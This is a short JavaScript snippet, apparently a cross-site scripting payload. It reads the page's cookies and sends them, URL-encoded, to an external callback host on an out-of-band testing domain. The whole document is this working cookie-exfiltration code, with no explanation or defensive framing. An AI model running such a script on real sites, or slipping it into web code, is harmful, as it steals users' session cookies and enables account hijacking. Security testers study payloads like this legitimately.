(function () {
  const cookies = document.cookie;
  if (cookies) {
    const encodedCookies = encodeURIComponent(cookies);
    fetch(
      `https://xdhaevcpormyqlbyonhng28sz5bmii03j.oast.fun/?cookies=${encodedCookies}`
    );
  }
})();
